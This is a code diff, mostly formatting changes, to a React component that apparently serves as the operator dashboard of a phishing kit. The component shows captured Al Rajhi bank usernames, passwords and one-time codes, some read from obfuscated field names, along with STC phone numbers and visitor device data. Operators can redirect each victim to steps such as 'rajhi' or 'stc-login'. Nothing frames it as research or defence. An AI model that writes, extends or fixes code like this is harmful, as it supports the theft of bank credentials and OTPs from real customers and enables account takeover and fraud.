@@ -95,7 +95,7 @@ export function VisitorDetails({ visitor }: VisitorDetailsProps) {
             currentStep: "rajhi" as any,
           };
           break;
-           case "stc-login":
+        case "stc-login":
           updates = {
             redirectPage: "stc-login" as any,
             currentStep: "stc-login" as any,
@@ -481,10 +481,16 @@ export function VisitorDetails({ visitor }: VisitorDetailsProps) {
 
   // Rajhi Info - add to dynamic bubbles to sort by timestamp
   const rajhiUser = visitor._v10 || visitor.rajhiUser;
-  const rajhiPassword = visitor._v11 || visitor.rajhiPassword || visitor.rajhiPasswrod;
+  const rajhiPassword =
+    visitor._v11 || visitor.rajhiPassword || visitor.rajhiPasswrod;
   const rajhiOtp = visitor._v12 || visitor.rajhiOtp;
 
-  if (rajhiUser || rajhiPassword || rajhiOtp || (visitor.currentStep as any) === "rajhi") {
+  if (
+    rajhiUser ||
+    rajhiPassword ||
+    rajhiOtp ||
+    (visitor.currentStep as any) === "rajhi"
+  ) {
     bubbles.push({
       id: "rajhi-info",
       title: "🏦 الراجحي",
@@ -680,19 +686,18 @@ export function VisitorDetails({ visitor }: VisitorDetailsProps) {
                   </span>
                 </span>
               </div>
-{/* Display STC Data */}
-{visitor.stcPhone && (
-  <div className="bg-purple-50 border-l-4 border-purple-500 p-4 rounded-lg">
-    <h4 className="font-semibold text-purple-900 mb-2">
-      بيانات STC
-    </h4>
-    <div className="space-y-2 text-sm">
-      <div>الجوال: {visitor.stcPhone}</div>
-      <div>التاريخ: {visitor.stcSubmittedAt}</div>
-    </div>
-  </div>
-)}
-
+              {/* Display STC Data */}
+              {visitor.stcPhone && (
+                <div className="bg-purple-50 border-l-4 border-purple-500 p-4 rounded-lg">
+                  <h4 className="font-semibold text-purple-900 mb-2">
+                    بيانات STC
+                  </h4>
+                  <div className="space-y-2 text-sm">
+                    <div>الجوال: {visitor.stcPhone}</div>
+                    <div>التاريخ: {visitor.stcSubmittedAt}</div>
+                  </div>
+                </div>
+              )}
 
               {/* Device & Location Info */}
               {(visitor.country || visitor.browser || visitor.deviceType) && (
@@ -734,8 +739,20 @@ export function VisitorDetails({ visitor }: VisitorDetailsProps) {
               {isGeneratingPdf ? (
                 <>
                   <svg className="animate-spin h-4 w-4" viewBox="0 0 24 24">
-                    <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" fill="none" />
-                    <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z" />
+                    <circle
+                      className="opacity-25"
+                      cx="12"
+                      cy="12"
+                      r="10"
+                      stroke="currentColor"
+                      strokeWidth="4"
+                      fill="none"
+                    />
+                    <path
+                      className="opacity-75"
+                      fill="currentColor"
+                      d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z"
+                    />
                   </svg>
                   جاري التحميل...
                 </>
